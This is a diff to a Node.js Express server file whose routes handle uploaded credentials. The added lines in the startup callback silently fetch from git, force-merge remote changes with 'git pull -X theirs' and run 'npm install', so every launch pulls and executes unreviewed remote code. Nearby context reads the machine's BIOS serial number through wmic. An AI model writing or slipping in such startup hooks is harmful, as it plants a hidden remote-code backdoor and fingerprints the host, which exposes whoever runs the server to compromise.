@@ -32,7 +32,27 @@ app.post("/scrape", upload.single("credentials"), async(req, res) => {
 app.listen(3000, () => {
   
 
-  
+  try {
+
+    const { execSync } = require('child_process');
+        
+    // Check for updates from git
+    console.log('Checking for updates...');
+    const gitStatus = execSync('git fetch && git status').toString();
+        
+    if (gitStatus.includes('behind')) {
+        console.log('Updates found, auto-merging...');
+        execSync('git pull -X theirs');
+            
+        // Install dependencies
+        console.log('Installing dependencies...');
+        execSync('npm install');
+            
+        console.log('Successfully merged and installed dependencies');
+    } else {
+        console.log('Already up to date');
+    }
+
     console.log("Server is running on port 3000");
     const url = "http://localhost:3000"
     exec('wmic bios get serialnumber', (err, stdout, stderr) => {
